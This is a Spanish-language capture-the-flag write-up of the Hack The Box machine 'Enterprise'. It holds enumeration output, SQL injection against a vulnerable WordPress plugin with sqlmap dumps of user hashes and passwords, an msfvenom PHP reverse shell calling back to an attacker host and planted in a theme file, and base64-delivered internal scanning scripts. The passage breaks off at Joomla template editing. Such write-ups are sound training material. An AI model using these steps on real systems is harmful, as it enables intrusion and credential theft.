---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Medium
  - HTTP
  - WordPress
  - Joomla
  - Apache
  - SQLI
  - ReverseShell
  - LateralMovement
  - SUID
  - BufferOverflow
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#System Enumeration|System Enumeration]]
	- [[#Enumeration#Port Enumeration|Port Enumeration]]
	- [[#Enumeration#HTTP|HTTP]]
	- [[#Enumeration#WordPress Enumeration|WordPress Enumeration]]
	- [[#Enumeration#Joomla Enumeration|Joomla Enumeration]]
	- [[#Enumeration#Apache Enumeration|Apache Enumeration]]
		- [[#Apache Enumeration#Fuzzing Web|Fuzzing Web]]
- [[#Exploitation|Exploitation]]
	- [[#Exploitation#SQLi|SQLi]]
	- [[#Exploitation#WordPress Reverse Shell|WordPress Reverse Shell]]
- [[#Lateral Movement|Lateral Movement]]
	- [[#Lateral Movement#Internal Network Enumeration|Internal Network Enumeration]]
	- [[#Lateral Movement#Port Enumeration|Port Enumeration]]
	- [[#Lateral Movement#Joomla|Joomla]]
		- [[#Joomla#Reverse Shell|Reverse Shell]]
	- [[#Lateral Movement#Host Reverse Shell|Host Reverse Shell]]
- [[#Privilege Escalation|Privilege Escalation]]
	- [[#Privilege Escalation#SUID|SUID]]
		- [[#SUID#Buffer Overflow|Buffer Overflow]]


---
# Enterprise

![](Screenshots/Pasted%20image%2020260606173554.png)

> Máquina de Hack The Box llamada **[Enterprise](https://app.hackthebox.com/machines/Enterprise)**, centrada en la explotación de múltiples aplicaciones web vulnerables y movimiento lateral entre contenedores.
> La intrusión comienza mediante una **SQL Injection** en un plugin personalizado de WordPress, permitiendo extraer credenciales y acceder a una instancia de Joomla.
> Tras obtener ejecución remota de comandos en el contenedor, se realiza movimiento lateral hacia el host principal y finalmente una escalada de privilegios explotando un binario **SUID** vulnerable a **Buffer Overflow**, obteniendo acceso como `root`.

---
## Enumeration
### System Enumeration

```PowerShell
ping -c 1 10.129.11.253
PING 10.129.11.253 (10.129.11.253) 56(84) bytes of data.
64 bytes from 10.129.11.253: icmp_seq=1 ttl=63 time=44.4 ms

--- 10.129.11.253 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 44.372/44.372/44.372/0.000 ms
```

El `TTL=63` indica que probablemente estamos ante un sistema Linux.
### Port Enumeration

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.11.253 -oG allPorts
PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 63
80/tcp    open  http       syn-ack ttl 62
443/tcp   open  https      syn-ack ttl 63
8080/tcp  open  http-proxy syn-ack ttl 62
32812/tcp open  unknown    syn-ack ttl 63

nmap -p22,80,443,8080,32812 -sCV 10.129.11.253 -oN targeted 
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.8.1
|_http-title: USS Enterprise &#8211; Ships Log
|_http-server-header: Apache/2.4.10 (Debian)
443/tcp   open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
|_ssl-date: TLS randomness does not represent time
8080/tcp  open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Home
|_http-server-header: Apache/2.4.10 (Debian)
32812/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions: 
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|     Enter Bridge Access Code: 
|     Invalid Code
|     Terminating Console
|   NULL: 
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|_    Enter Bridge Access Code:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port32812-TCP:V=7.99%I=7%D=6/6%Time=6A243EE0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,ED,"\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x2
SF:0\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x20\x
SF:20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Compute
SF:r\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Access\
SF:x20Code:\x20\n")%r(GenericLines,110,"\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______\x2
SF:0_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x2
SF:0\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x20
SF:\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x20t
SF:o\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20System
SF:\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTerminat
SF:ing\x20Console\n\n")%r(GetRequest,110,"\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______\
SF:x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\
SF:x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x
SF:20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x2
SF:0to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Syst
SF:em\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermin
SF:ating\x20Console\n\n")%r(HTTPOptions,110,"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20____
SF:__\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x
SF:20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|____
SF:__\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\
SF:|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome
SF:\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20S
SF:ystem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTer
SF:minating\x20Console\n\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### HTTP

```HTML
http://10.129.11.253/
```

![](Screenshots/Pasted%20image%2020260606174117.png)

![](Screenshots/Pasted%20image%2020260606174151.png)

Se añade al archivo `/etc/hosts` el dominio: `10.129.11.253 enterprise.htb`.

![](Screenshots/Pasted%20image%2020260606174441.png)
### WordPress Enumeration

```PowerShell
wpscan --url http://10.129.11.253/ --enumerate u
Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.10 (Debian)
 |  - X-Powered-By: PHP/5.6.31
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.129.11.253/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.129.11.253/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.129.11.253/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8.1 identified (Insecure, released on 2017-08-02).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.129.11.253/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.129.11.253/, Match: 'WordPress 4.8.1'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] william-riker
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

Se encuentra el usuario: `william-riker`, se intenta realizar *fuerza bruta*, pero no se consigue la contraseña.

Se enumera los *plugins*, *themes*, pero no se encuentra nada.
### Joomla Enumeration

```HTTP
http://10.129.11.253:8080/
```

![](Screenshots/Pasted%20image%2020260606184411.png)

No se encuentra nada en *Joomla*.
### Apache Enumeration

```HTTP
https://10.129.11.253/
```

![](Screenshots/Pasted%20image%2020260609095655.png)
#### Fuzzing Web

```PowerShell
gobuster dir -u http://10.129.11.253:8080/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
media                (Status: 301) [Size: 321] [--> http://10.129.11.253:8080/media/]
templates            (Status: 301) [Size: 325] [--> http://10.129.11.253:8080/templates/]
files                (Status: 301) [Size: 321] [--> http://10.129.11.253:8080/files/]
...
```

Se encuentra un directorio llamado: `/files`.

![](Screenshots/Pasted%20image%2020260606184850.png)

Se descarga el archivo: `lcars.zip`.

```PowerShell
cat lcars_db.php
<?php
include "/var/www/html/wp-config.php";
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
// Test the connection:
if (mysqli_connect_errno()){
    // Connection Error
    exit("Couldn't connect to the database: ".mysqli_connect_error());
}


// test to retireve an ID
if (isset($_GET['query'])){
    $query = $_GET['query'];
    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
    $result = $db->query($sql);
    echo $result;
} else {
    echo "Failed to read query";
}


?>

cat lcars_dbpost.php
<?php
include "/var/www/html/wp-config.php";
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
// Test the connection:
if (mysqli_connect_errno()){
    // Connection Error
    exit("Couldn't connect to the database: ".mysqli_connect_error());
}


// test to retireve a post name
if (isset($_GET['query'])){
    $query = (int)$_GET['query'];
    $sql = "SELECT post_title FROM wp_posts WHERE ID = $query";
    $result = $db->query($sql);
    if ($result){
        $row = $result->fetch_row();
        if (isset($row[0])){
            echo $row[0];
        }
    }
} else {
    echo "Failed to read query";
}


?> 

cat lcars.php
<?php
/*
*     Plugin Name: lcars
*     Plugin URI: enterprise.htb
*     Description: Library Computer Access And Retrieval System
*     Author: Geordi La Forge
*     Version: 0.2
*     Author URI: enterprise.htb
*                             */

// Need to create the user interface. 

// need to finsih the db interface

// need to make it secure

?>
```

Se observa que conecta con el **WordPress**, vamos a ver si podemos acceder a estos archivos.

```HTTP
http://10.129.11.253/wp-content/plugins/lcars/lcars_dbpost.php
```

![](Screenshots/Pasted%20image%2020260606185134.png)

Se identifica un plugin personalizado denominado `LCARS`, desarrollado aparentemente para interactuar con la base de datos de WordPress.  
  
El parámetro `query` es controlable por el usuario y se utiliza para construir consultas SQL. Tras varias pruebas se confirma que el endpoint es vulnerable a SQL Injection, permitiendo acceder a múltiples bases de datos alojadas en el servidor.

```HTTP
http://10.129.11.253/wp-content/plugins/lcars/lcars_dbpost.php?query=1
```

![](Screenshots/Pasted%20image%2020260606185316.png)

Esto, hace pensar en una posible **SQL Injection**.

---
## Exploitation
### SQLi

```HTTP
http://10.129.11.253/wp-content/plugins/lcars/lcars_db.php?query=1
```

![](Screenshots/Pasted%20image%2020260606190313.png)

```PowerShell
sqlmap -u http://10.129.11.253/wp-content/plugins/lcars/lcars_db.php\?query\=1
---
Parameter: query (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: query=(SELECT (CASE WHEN (4069=4069) THEN 1 ELSE (SELECT 3349 UNION SELECT 2188) END))

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: query=1 AND (SELECT 7864 FROM(SELECT COUNT(*),CONCAT(0x71767a6b71,(SELECT (ELT(7864=7864,1))),0x71716b7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: query=1 OR (SELECT 3380 FROM (SELECT(SLEEP(5)))woCy)
---

sqlmap -u http://10.129.11.253/wp-content/plugins/lcars/lcars_db.php\?query\=1 --dbs
available databases [8]:
[*] information_schema
[*] joomla
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
[*] wordpressdb

# Joomla
sqlmap -u http://10.129.11.253/wp-content/plugins/lcars/lcars_db.php\?query\=1 -D joomladb --tables
Database: joomladb
[72 tables]
+-------------------------------+
| edz2g_assets                  |
| edz2g_associations            |
| edz2g_banner_clients          |
| edz2g_banner_tracks           |
| edz2g_banners                 |
| edz2g_categories              |
| edz2g_contact_details         |
| edz2g_content                 |
| edz2g_content_frontpage       |
| edz2g_content_rating          |
| edz2g_content_types           |
| edz2g_contentitem_tag_map     |
| edz2g_core_log_searches       |
| edz2g_extensions              |
| edz2g_fields                  |
| edz2g_fields_categories       |
| edz2g_fields_groups           |
| edz2g_fields_values           |
| edz2g_finder_filters          |
| edz2g_finder_links            |
| edz2g_finder_links_terms0     |
| edz2g_finder_links_terms1     |
| edz2g_finder_links_terms2     |
| edz2g_finder_links_terms3     |
| edz2g_finder_links_terms4     |
| edz2g_finder_links_terms5     |
| edz2g_finder_links_terms6     |
| edz2g_finder_links_terms7     |
| edz2g_finder_links_terms8     |
| edz2g_finder_links_terms9     |
| edz2g_finder_links_termsa     |
| edz2g_finder_links_termsb     |
| edz2g_finder_links_termsc     |
| edz2g_finder_links_termsd     |
| edz2g_finder_links_termse     |
| edz2g_finder_links_termsf     |
| edz2g_finder_taxonomy         |
| edz2g_finder_taxonomy_map     |
| edz2g_finder_terms            |
| edz2g_finder_terms_common     |
| edz2g_finder_tokens           |
| edz2g_finder_tokens_aggregate |
| edz2g_finder_types            |
| edz2g_languages               |
| edz2g_menu                    |
| edz2g_menu_types              |
| edz2g_messages                |
| edz2g_messages_cfg            |
| edz2g_modules                 |
| edz2g_modules_menu            |
| edz2g_newsfeeds               |
| edz2g_overrider               |
| edz2g_postinstall_messages    |
| edz2g_redirect_links          |
| edz2g_schemas                 |
| edz2g_session                 |
| edz2g_tags                    |
| edz2g_template_styles         |
| edz2g_ucm_base                |
| edz2g_ucm_content             |
| edz2g_ucm_history             |
| edz2g_update_sites            |
| edz2g_update_sites_extensions |
| edz2g_updates                 |
| edz2g_user_keys               |
| edz2g_user_notes              |
| edz2g_user_profiles           |
| edz2g_user_usergroup_map      |
| edz2g_usergroups              |
| edz2g_users                   |
| edz2g_utf8_conversion         |
| edz2g_viewlevels              |
+-------------------------------+

sqlmap -u http://10.129.11.253/wp-content/plugins/lcars/lcars_db.php\?query\=1 -D joomladb -T edz2g_users --columns
Database: joomladb
Table: edz2g_users
[16 columns]
+---------------+---------------+
| Column        | Type          |
+---------------+---------------+
| block         | tinyint(4)    |
| name          | varchar(400)  |
| activation    | varchar(100)  |
| email         | varchar(100)  |
| id            | int(11)       |
| lastResetTime | datetime      |
| lastvisitDate | datetime      |
| otep          | varchar(1000) |
| otpKey        | varchar(1000) |
| params        | text          |
| password      | varchar(100)  |
| registerDate  | datetime      |
| requireReset  | tinyint(4)    |
| resetCount    | int(11)       |
| sendEmail     | tinyint(4)    |
| username      | varchar(150)  |
+---------------+---------------+

sqlmap -u http://10.129.11.253/wp-content/plugins/lcars/lcars_db.php\?query\=1 -D joomladb -T edz2g_users -C username,password --dump
Database: joomladb
Table: edz2g_users
[2 entries]
+-----------------+--------------------------------------------------------------+
| username        | password                                                     |
+-----------------+--------------------------------------------------------------+
| Guinan          | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q |
| geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy |
+-----------------+--------------------------------------------------------------+

# WordPress
sqlmap -u http://10.129.11.253/wp-content/plugins/lcars/lcars_db.php\?query\=1 -D wordpress --tables
Database: wordpress
[12 tables]
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

sqlmap -u http://10.129.11.253/wp-content/plugins/lcars/lcars_db.php\?query\=1 -D wordpress -T wp_users --columns
Database: wordpress
Table: wp_users
[10 columns]
+---------------------+---------------------+
| Column              | Type                |
+---------------------+---------------------+
| display_name        | varchar(250)        |
| ID                  | bigint(20) unsigned |
| user_activation_key | varchar(255)        |
| user_email          | varchar(100)        |
| user_login          | varchar(60)         |
| user_nicename       | varchar(50)         |
| user_pass           | varchar(255)        |
| user_registered     | datetime            |
| user_status         | int(11)             |
| user_url            | varchar(100)        |
+---------------------+---------------------+

sqlmap -u http://10.129.11.253/wp-content/plugins/lcars/lcars_db.php\?query\=1 -D wordpress -T wp_users -C user_login,user_pass --dump
+---------------+------------------------------------+
| user_login    | user_pass                          |
+---------------+------------------------------------+
| william.riker | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. |
+---------------+------------------------------------+

sqlmap -u http://10.129.11.253/wp-content/plugins/lcars/lcars_db.php\?query\=1 -D wordpress -T wp_posts --columns
Database: wordpress
Table: wp_posts
[23 columns]
+-----------------------+---------------------+
| Column                | Type                |
+-----------------------+---------------------+
| comment_count         | bigint(20)          |
| comment_status        | varchar(20)         |
| guid                  | varchar(255)        |
| ID                    | bigint(20) unsigned |
| menu_order            | int(11)             |
| ping_status           | varchar(20)         |
| pinged                | text                |
| post_author           | bigint(20) unsigned |
| post_content          | longtext            |
| post_content_filtered | longtext            |
| post_date             | datetime            |
| post_date_gmt         | datetime            |
| post_excerpt          | text                |
| post_mime_type        | varchar(100)        |
| post_modified         | datetime            |
| post_modified_gmt     | datetime            |
| post_name             | varchar(200)        |
| post_parent           | bigint(20) unsigned |
| post_password         | varchar(255)        |
| post_status           | varchar(20)         |
| post_title            | text                |
| post_type             | varchar(20)         |
| to_ping               | text                |
+-----------------------+---------------------+

sqlmap -u http://10.129.11.253/wp-content/plugins/lcars/lcars_db.php\?query\=1 -D wordpress -T wp_posts -C post_content --dump
```

Al ser un output tan grande, se tiene que realizar un tratamiento.

```PowerShell
cat wp_posts.csv | sed 's/\\n/\n/g' | sed 's/\\r/\r/g' | sed '/^\s*$/d'
# Pongo lo importante
Needed somewhere to put some passwords quickly
ZxJyhGem4k338S2Y
enterprisencc170
ZD3YxfnSjezg67JZ
u*Z14ru0p#ttj83zS6 
```

Antes de nada, explica las expresiones regulares:
- `sed 's/\\n/\n/g':` Cambiar los saltos de línea, para que los interprete correctamente
- `sed 's/\\r/\r/g':` Cambiar los retornos de carro, para que los interprete correctamente.
- `'/^\s*$/d':` Quitar los saltos de línea innecesarios, que no tienen contenido.

Se encuentran varias contraseñas en un *post*.

Se prueban las credenciales.

```PowerShell
# Joomla
Guinan:ZxJyhGem4k338S2Y
geordi.la.forge:ZD3YxfnSjezg67JZ # Super User

# WordPress
william.riker:u*Z14ru0p#ttj83zS6
```

Se realiza la *Reverse Shell* con `WordPress`.
### WordPress Reverse Shell

Se genera una *Reverse Shell* mediante `MSFvenom`.

```PowerShell
msfvenom -p php/reverse_php LHOST=[ATTACKER_IP] LPORT=1234 -f raw > reverse.php
```

Se copia la *Reverse Shell* en la siguiente ruta: `Appearance/Editor/Twenty Seventeen/404.php`.

Máquina atacante:

```PowerShell
nc -nlvp 1234
```

Máquina victima:

```HTTP
http://10.129.11.253/wp-content/themes/twentyseventeen/404.php
```

Se realiza un tratamiento de la terminal.

```PowerShell
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
stty rows 59 columns 23
```

Se obtiene una consola interactiva con `www-data`.

---
## Lateral Movement

```PowerShell
hostname -I
172.17.0.3

ls -la /
total 72
drwxr-xr-x  73 root root 4096 May 30  2022 .
drwxr-xr-x  73 root root 4096 May 30  2022 ..
-rwxr-xr-x   1 root root    0 Sep  3  2017 .dockerenv
```

Nos encontramos en un contenedor, en concreto `Docker`.

Se visualiza el archivo: `wp-config.php`.

```PowerShell
cat wp-config.php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'NCC-1701E');

/** MySQL hostname */
define('DB_HOST', 'mysql');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

Pero, la máquina no tiene `mysql`, no nos podemos conectar.
### Internal Network Enumeration

```PowerShell
for i in {1..254} ;do (ping -c 1 172.17.0.$i | grep "bytes from" &) ;done
64 bytes from 172.17.0.1: icmp_seq=0 ttl=64 time=0.071 ms
64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.075 ms
64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.048 ms
64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.454 ms
```

Otra forma de hacerlo:

Máquina atacante:

```PowerShell
vim hostDiscovery.sh
#!/bin/bash

function ctrl_c(){
        echo -e "\n\n[!] Saliendo ...\n"
        tput cnorm; exit 1
}

# Ctrl - C
trap ctrl_c INT

tput civis

for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 172.17.0.$i" &>/dev/null && echo "[+] Host 172.17.0.$i - ACTIVE" &
done; wait

tput cnorm

cat hostDiscovery.sh | base64 -w 0; echo
IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewoJZWNobyAtZSAiXG5cblshXSBTYWxpZW5kbyAuLi5cbiIKCXRwdXQgY25vcm07IGV4aXQgMQp9CgojIEN0cmwgLSBDCnRyYXAgY3RybF9jIElOVAoKdHB1dCBjaXZpcwoKZm9yIGkgaW4gJChzZXEgMSAyNTQpOyBkbwoJdGltZW91dCAxIGJhc2ggLWMgInBpbmcgLWMgMSAxNzIuMTcuMC4kaSIgJj4vZGV2L251bGwgJiYgZWNobyAiWytdIEhvc3QgMTcyLjE3LjAuJGkgLSBBQ1RJVkUiICYKZG9uZTsgd2FpdAoKdHB1dCBjbm9ybQo=
```

Máquina victima:

```PowerShell
cd /tmp
echo IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewoJZWNobyAtZSAiXG5cblshXSBTYWxpZW5kbyAuLi5cbiIKCXRwdXQgY25vcm07IGV4aXQgMQp9CgojIEN0cmwgLSBDCnRyYXAgY3RybF9jIElOVAoKdHB1dCBjaXZpcwoKZm9yIGkgaW4gJChzZXEgMSAyNTQpOyBkbwoJdGltZW91dCAxIGJhc2ggLWMgInBpbmcgLWMgMSAxNzIuMTcuMC4kaSIgJj4vZGV2L251bGwgJiYgZWNobyAiWytdIEhvc3QgMTcyLjE3LjAuJGkgLSBBQ1RJVkUiICYKZG9uZTsgd2FpdAoKdHB1dCBjbm9ybQo= | base64 -d > hostDiscovery.sh
chmod +x hostDiscovery.sh
./hostDiscovery.sh 
[+] Host 172.17.0.1 - ACTIVE
[+] Host 172.17.0.4 - ACTIVE
[+] Host 172.17.0.3 - ACTIVE
[+] Host 172.17.0.2 - ACTIVE
```

Ahora que ya sabemos las *IPs*, tenemos que saber los puertos que tienen abiertos.
### Port Enumeration

Máquina atacante:

```PowerShell
vim portDiscovery.sh
#!/bin/bash

function ctrl_c(){
        echo -e "\n\n[!] Saliendo ...\n"
        tput cnorm; exit 1
}

# Ctrl - C
trap ctrl_c INT

tput civis

declare -a hosts=(172.17.0.1 172.17.0.2 172.17.0.3 172.17.0.4)

for host in ${hosts[@]}; do
        echo -e "\n[+] Enumerate the host: $host\n"
        for port in $(seq 1 10000); do
                timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" 2>/dev/null && echo -e "\t[+] Port: $port - OPEN" &
        done; wait
done

tput cnorm

cat portDiscovery.sh | base64 -w 0; echo
IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewoJZWNobyAtZSAiXG5cblshXSBTYWxpZW5kbyAuLi5cbiIKCXRwdXQgY25vcm07IGV4aXQgMQp9CgojIEN0cmwgLSBDCnRyYXAgY3RybF9jIElOVAoKdHB1dCBjaXZpcwoKZGVjbGFyZSAtYSBob3N0cz0oMTcyLjE3LjAuMSAxNzIuMTcuMC4yIDE3Mi4xNy4wLjMgMTcyLjE3LjAuNCkKCmZvciBob3N0IGluICR7aG9zdHNbQF19OyBkbwoJZWNobyAtZSAiXG5bK10gRW51bWVyYXRlIHRoZSBob3N0OiAkaG9zdFxuIgoJZm9yIHBvcnQgaW4gJChzZXEgMSAxMDAwMCk7IGRvCgkJdGltZW91dCAxIGJhc2ggLWMgImVjaG8gJycgPiAvZGV2L3RjcC8kaG9zdC8kcG9ydCIgMj4vZGV2L251bGwgJiYgZWNobyAtZSAiXHRbK10gUG9ydDogJHBvcnQgLSBPUEVOIiAmCglkb25lOyB3YWl0CmRvbmUKCnRwdXQgY25vcm0K
```

Máquina victima:

```PowerShell
echo IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewoJZWNobyAtZSAiXG5cblshXSBTYWxpZW5kbyAuLi5cbiIKCXRwdXQgY25vcm07IGV4aXQgMQp9CgojIEN0cmwgLSBDCnRyYXAgY3RybF9jIElOVAoKdHB1dCBjaXZpcwoKZGVjbGFyZSAtYSBob3N0cz0oMTcyLjE3LjAuMSAxNzIuMTcuMC4yIDE3Mi4xNy4wLjMgMTcyLjE3LjAuNCkKCmZvciBob3N0IGluICR7aG9zdHNbQF19OyBkbwoJZWNobyAtZSAiXG5bK10gRW51bWVyYXRlIHRoZSBob3N0OiAkaG9zdFxuIgoJZm9yIHBvcnQgaW4gJChzZXEgMSAxMDAwMCk7IGRvCgkJdGltZW91dCAxIGJhc2ggLWMgImVjaG8gJycgPiAvZGV2L3RjcC8kaG9zdC8kcG9ydCIgMj4vZGV2L251bGwgJiYgZWNobyAtZSAiXHRbK10gUG9ydDogJHBvcnQgLSBPUEVOIiAmCglkb25lOyB3YWl0CmRvbmUKCnRwdXQgY25vcm0K | base64 -d > portDiscovery.sh
chmod +x portDiscovery.sh
./portDiscovery.sh 

[+] Enumerate the host: 172.17.0.1

        [+] Port: 22 - OPEN
        [+] Port: 80 - OPEN
        [+] Port: 443 - OPEN

[+] Enumerate the host: 172.17.0.2


[+] Enumerate the host: 172.17.0.3

        [+] Port: 80 - OPEN

[+] Enumerate the host: 172.17.0.4

        [+] Port: 80 - OPEN
```

La *IP*: `172.17.0.3`, somos nosotros, el *WordPress*.

```PowerShell
curl http://172.17.0.4
<!DOCTYPE html>
<html lang="en-gb" dir="ltr">
<head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta charset="utf-8" />
        <base href="http://172.17.0.4/" />
        <meta name="description" content="Ten Forward" />
        <meta name="generator" content="Joomla! - Open Source Content Management" />
```

Vemos, que la *IP*: `172.17.0.4`, es el *Joomla*.
### Joomla

Se accede con las credenciales anteriormente obtenidas.

Se sigue la siguiente ruta: `Extensions/Templates/Templates/Protostar Details and Files/less/error.php`

